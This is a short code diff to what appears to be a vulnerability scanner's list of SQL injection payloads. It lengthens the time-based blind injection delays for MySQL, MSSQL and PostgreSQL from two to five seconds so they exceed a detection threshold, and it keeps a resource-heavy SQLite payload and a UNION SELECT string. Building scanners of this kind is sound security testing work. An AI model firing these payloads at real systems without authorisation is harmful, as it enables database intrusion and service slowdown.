@@ -16,15 +16,17 @@ export const SQLI_PAYLOADS = [
   "' UNION SELECT NULL--",
 ];
 
-/** Time-based blind SQLi payloads — separated so we can measure response timing */
+/** Time-based blind SQLi payloads — separated so we can measure response timing.
+ *  Uses 5-second delays to reliably exceed BLIND_SQLI_THRESHOLD_MS (3500ms)
+ *  while leaving 1.5s margin for network latency. */
 export const SQLI_TIME_PAYLOADS = [
   // MySQL
-  "' OR SLEEP(2)--",
-  "1 OR SLEEP(2)--",
+  "' OR SLEEP(5)--",
+  "1 OR SLEEP(5)--",
   // MSSQL
-  "1; WAITFOR DELAY '0:0:2'--",
+  "1; WAITFOR DELAY '0:0:5'--",
   // PostgreSQL
-  "'; SELECT pg_sleep(2)--",
+  "'; SELECT pg_sleep(5)--",
   // SQLite (no sleep, but heavy computation)
   "1 OR 1=1 AND RANDOMBLOB(500000000)--",
 ];
